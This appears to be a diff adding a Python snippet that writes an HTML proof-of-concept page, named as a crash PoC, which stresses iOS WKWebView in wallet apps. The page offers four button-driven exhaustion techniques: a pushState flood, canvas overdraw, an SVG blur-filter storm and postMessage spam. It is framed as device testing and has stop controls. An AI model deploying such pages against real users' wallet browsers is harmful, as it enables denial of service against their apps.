@@ -1,0 +1,251 @@
+# Create a PoC HTML file with several iOS WKWebView stress techniques
+html_content = r"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WKWebView Stress PoC (iOS Wallets)</title>
+<style>
+  :root { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; }
+  body { margin: 0; background: #0b0b0b; color: #e8e8e8; }
+  header { padding: 16px 20px; background: #111; position: sticky; top: 0; z-index: 5; }
+  h1 { font-size: 18px; margin: 0 0 6px; }
+  .grid { display: grid; gap: 12px; padding: 16px; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); }
+  .card { background: #141414; border: 1px solid #222; border-radius: 14px; padding: 14px; }
+  .row { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
+  .btn { background: #2a2a2a; border: 1px solid #3a3a3a; color: #e8e8e8; padding: 8px 12px; border-radius: 10px; cursor: pointer; }
+  .btn:disabled { opacity: .5; cursor: not-allowed; }
+  label { display: block; font-size: 14px; margin-bottom: 8px; }
+  input[type=number] { width: 110px; background: #0f0f0f; color: #e8e8e8; border: 1px solid #333; border-radius: 8px; padding: 6px; }
+  .log { height: 160px; background: #0f0f0f; border: 1px solid #222; border-radius: 10px; padding: 10px; overflow: auto; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 12px; }
+  .warn { color: #ffde59; }
+  .danger { color: #ff6b6b; }
+  .ok { color: #6bff93; }
+  small { color: #aaa; }
+  canvas { display: block; margin-top: 8px; width: 100%; height: 140px; background: #090909; }
+</style>
+</head>
+<body>
+  <header>
+    <h1>WKWebView Stress PoC (for iOS Wallet Testing)</h1>
+    <small class="warn">Use on your own device/test environment only. This page may freeze or close the webview.</small>
+  </header>
+
+  <div class="grid">
+    <!-- pushState Flood -->
+    <div class="card">
+      <h3>1) history.pushState Flood</h3>
+      <label>Iterations per tick <input id="psBatch" type="number" min="1" value="500"></label>
+      <div class="row">
+        <button class="btn" id="psStart">Start</button>
+        <button class="btn" id="psStop" disabled>Stop</button>
+      </div>
+      <small>Continuously pushes history entries to pressure navigation stack.</small>
+    </div>
+
+    <!-- Canvas Pressure -->
+    <div class="card">
+      <h3>2) Canvas Overdraw</h3>
+      <label>Canvas size (px) <input id="cvSize" type="number" min="256" value="2048"></label>
+      <label>Rects per frame <input id="cvRects" type="number" min="10" value="2000"></label>
+      <div class="row">
+        <button class="btn" id="cvStart">Start</button>
+        <button class="btn" id="cvStop" disabled>Stop</button>
+      </div>
+      <small>Fills a large canvas with many rectangles every frame.</small>
+      <canvas id="cv"></canvas>
+    </div>
+
+    <!-- SVG Filter Storm -->
+    <div class="card">
+      <h3>3) SVG Filter Storm</h3>
+      <label>Copies <input id="svgCopies" type="number" min="10" value="400"></label>
+      <div class="row">
+        <button class="btn" id="svgStart">Start</button>
+        <button class="btn" id="svgStop" disabled>Stop</button>
+      </div>
+      <small>Replicates SVG elements with heavy Gaussian blur filters.</small>
+      <div id="svgHost"></div>
+    </div>
+
+    <!-- postMessage Spam -->
+    <div class="card">
+      <h3>4) postMessage Spam</h3>
+      <label>Messages per tick <input id="pmBatch" type="number" min="10" value="1000"></label>
+      <div class="row">
+        <button class="btn" id="pmStart">Start</button>
+        <button class="btn" id="pmStop" disabled>Stop</button>
+      </div>
+      <small>Spams messages to a same-origin iframe to stress event queue.</small>
+      <iframe id="echo" sandbox="allow-scripts" style="width:0;height:0;border:0;"></iframe>
+    </div>
+
+    <!-- Log -->
+    <div class="card" style="grid-column: 1/-1;">
+      <h3>Log</h3>
+      <div id="log" class="log"></div>
+    </div>
+  </div>
+
+<script>
+const log = (m, cls="") => {
+  const el = document.getElementById('log');
+  const line = document.createElement('div');
+  if (cls) line.className = cls;
+  line.textContent = new Date().toLocaleTimeString() + " — " + m;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+};
+
+// 1) pushState Flood
+let psTimer = null;
+function psTick() {
+  const batch = parseInt(document.getElementById('psBatch').value) || 100;
+  try {
+    for (let i=0; i<batch; i++) {
+      history.pushState({}, "", "#"+Math.random().toString(36).slice(2));
+    }
+    log(`pushState +${batch}`);
+  } catch(e) {
+    log("pushState error: " + e.message, "danger");
+  }
+}
+document.getElementById('psStart').onclick = () => {
+  if (psTimer) return;
+  psTimer = setInterval(psTick, 0);
+  document.getElementById('psStart').disabled = true;
+  document.getElementById('psStop').disabled = false;
+  log("pushState flood started", "ok");
+};
+document.getElementById('psStop').onclick = () => {
+  clearInterval(psTimer); psTimer=null;
+  document.getElementById('psStart').disabled = false;
+  document.getElementById('psStop').disabled = true;
+  log("pushState flood stopped", "warn");
+};
+
+// 2) Canvas Overdraw
+let cvRAF = null, ctx = null;
+document.getElementById('cvStart').onclick = () => {
+  const size = parseInt(document.getElementById('cvSize').value) || 1536;
+  const rects = parseInt(document.getElementById('cvRects').value) || 1000;
+  const cv = document.getElementById('cv');
+  cv.width = size; cv.height = size;
+  ctx = cv.getContext('2d', { willReadFrequently: true });
+  function draw() {
+    try {
+      for (let i=0; i<rects; i++) {
+        ctx.fillStyle = `rgba(${(Math.random()*255)|0},${(Math.random()*255)|0},${(Math.random()*255)|0},0.8)`;
+        const x = Math.random()*size, y = Math.random()*size;
+        const w = (Math.random()*size/2)|0, h = (Math.random()*size/2)|0;
+        ctx.fillRect(x,y,w,h);
+      }
+    } catch(e) {
+      log("Canvas error: " + e.message, "danger");
+    }
+    cvRAF = requestAnimationFrame(draw);
+  }
+  if (!cvRAF) {
+    draw();
+    document.getElementById('cvStart').disabled = true;
+    document.getElementById('cvStop').disabled = false;
+    log(`Canvas overdraw started (size=${size}, rects/frame=${rects})`, "ok");
+  }
+};
+document.getElementById('cvStop').onclick = () => {
+  if (cvRAF) cancelAnimationFrame(cvRAF);
+  cvRAF = null;
+  document.getElementById('cvStart').disabled = false;
+  document.getElementById('cvStop').disabled = true;
+  log("Canvas overdraw stopped", "warn");
+};
+
+// 3) SVG Filter Storm
+let svgActive = false;
+document.getElementById('svgStart').onclick = () => {
+  if (svgActive) return;
+  svgActive = true;
+  document.getElementById('svgStart').disabled = true;
+  document.getElementById('svgStop').disabled = false;
+  const host = document.getElementById('svgHost');
+  const copies = parseInt(document.getElementById('svgCopies').value) || 200;
+  const svgNS = "http://www.w3.org/2000/svg";
+  const svg = document.createElementNS(svgNS, "svg");
+  svg.setAttribute("width", "100%");
+  svg.setAttribute("height", "160");
+  const defs = document.createElementNS(svgNS, "defs");
+  const filter = document.createElementNS(svgNS, "filter");
+  filter.setAttribute("id", "blurz");
+  const fe = document.createElementNS(svgNS, "feGaussianBlur");
+  fe.setAttribute("stdDeviation", "8");
+  filter.appendChild(fe);
+  defs.appendChild(filter);
+  svg.appendChild(defs);
+  for (let i=0;i<copies;i++) {
+    const c = document.createElementNS(svgNS, "circle");
+    c.setAttribute("cx", (Math.random()*600)|0);
+    c.setAttribute("cy", (Math.random()*140)|0);
+    c.setAttribute("r", (Math.random()*60+10)|0);
+    c.setAttribute("fill", "white");
+    c.setAttribute("filter", "url(#blurz)");
+    svg.appendChild(c);
+  }
+  host.appendChild(svg);
+  log(`SVG filter storm started (${copies} elems)`, "ok");
+};
+document.getElementById('svgStop').onclick = () => {
+  const host = document.getElementById('svgHost');
+  host.innerHTML = "";
+  document.getElementById('svgStart').disabled = false;
+  document.getElementById('svgStop').disabled = true;
+  svgActive = false;
+  log("SVG filter storm cleared", "warn");
+};
+
+// 4) postMessage Spam
+let pmTimer = null;
+(function initEcho(){
+  const frame = document.getElementById('echo');
+  const blob = new Blob([`<!DOCTYPE html><title>echo</title><script>onmessage=e=>postMessage(e.data,'*')</script>`], {type:'text/html'});
+  frame.src = URL.createObjectURL(blob);
+})();
+document.getElementById('pmStart').onclick = () => {
+  if (pmTimer) return;
+  const batch = parseInt(document.getElementById('pmBatch').value) || 1000;
+  const frame = document.getElementById('echo').contentWindow;
+  pmTimer = setInterval(() => {
+    try {
+      for (let i=0;i<batch;i++) frame.postMessage("x", "*");
+      log(`postMessage +${batch}`);
+    } catch(e) {
+      log("postMessage error: " + e.message, "danger");
+    }
+  }, 0);
+  document.getElementById('pmStart').disabled = true;
+  document.getElementById('pmStop').disabled = false;
+  log("postMessage spam started", "ok");
+};
+document.getElementById('pmStop').onclick = () => {
+  clearInterval(pmTimer); pmTimer=null;
+  document.getElementById('pmStart').disabled = false;
+  document.getElementById('pmStop').disabled = true;
+  log("postMessage spam stopped", "warn");
+};
+
+// Safety: attempt to stop loops on page hide
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    if (psTimer) { clearInterval(psTimer); psTimer=null; }
+    if (pmTimer) { clearInterval(pmTimer); pmTimer=null; }
+    if (cvRAF) { cancelAnimationFrame(cvRAF); cvRAF=null; }
+  }
+});
+</script>
+</body>
+</html>
+"""
+path = "/mnt/data/phantom_ios_crash_poc.html"
+with open(path, "w", encoding="utf-8") as f:
+    f.write(html_content)
+
+path
